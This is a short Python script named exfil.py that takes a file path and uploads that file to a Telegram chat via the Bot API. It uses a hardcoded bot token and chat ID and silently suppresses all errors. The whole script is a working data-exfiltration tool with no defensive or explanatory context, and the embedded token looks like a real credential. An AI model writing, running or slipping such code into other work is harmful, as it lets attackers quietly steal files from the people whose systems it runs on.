# exfil.py
import sys
import requests
import os

TELEGRAM_BOT = "8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk"
CHAT_ID = "1827631234"

def send_telegram(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": CHAT_ID}
            requests.post(url, files=files, data=data, timeout=10)
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) > 1:
        send_telegram(sys.argv[1])